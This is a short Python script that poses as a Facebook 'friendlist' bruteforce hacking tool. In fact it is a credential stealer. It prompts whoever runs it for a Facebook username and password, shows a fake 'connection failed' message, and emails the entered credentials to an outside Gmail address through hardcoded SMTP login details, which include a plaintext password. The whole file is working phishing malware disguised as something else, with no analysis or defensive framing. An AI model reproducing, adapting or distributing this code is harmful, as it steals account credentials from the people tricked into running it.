# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail
x=yagmail.SMTP('halosayang65@gmail.com','5t4r51ck')
subject='Akun Target'
logo = """\x1b[34m

 8888888888                        888                        888      
888                               888                        888      
888                               888                        888      
8888888  8888b.   .d8888b .d88b.  88888b.   .d88b.   .d88b.  888  888 
888         "88b d88P"   d8P  Y8b 888 "88b d88""88b d88""88b 888 .88P 
888     .d888888 888     88888888 888  888 888  888 888  888 888888K  
888     888  888 Y88b.   Y8b.     888 d88P Y88..88P Y88..88P 888 "88b 
888     "Y888888  "Y8888P "Y8888  88888P"   "Y88P"   "Y88P"  888  888 
                                                                      
                                                                      
                                                                      \x1b[00m"""

banner = """
\x1b[34mHack Friendlist Facebook 2020
\x1b[00mAutomatic cracking password with Bruteforce
\x1b[00mPlease login with your account \x1b[91m!
"""
def main():
	os.system('clear')
	print(logo)
	print(banner)
	print('\x1b[00m\033[41m FACEBOOK LOGIN \033[00m')
	u=input('\x1b[00mUsername: \x1b[33m')
	p=input('\x1b[00mPassword: \x1b[33m')
	msg=('username: '+u+', password: '+p)
	body=(msg)
	print('')
	print('\x1b[00mSorry, connection failed\x1b[91m !\x1b[00m')
	print('\x1b[33mPlease try again later ...')
	os.system('sleep 3')
	print('')
	print('\x1b[00mExiting program \x1b[91m!')
	os.system('exit')
	x.send('mrsick490@gmail.com',subject,body)

main()
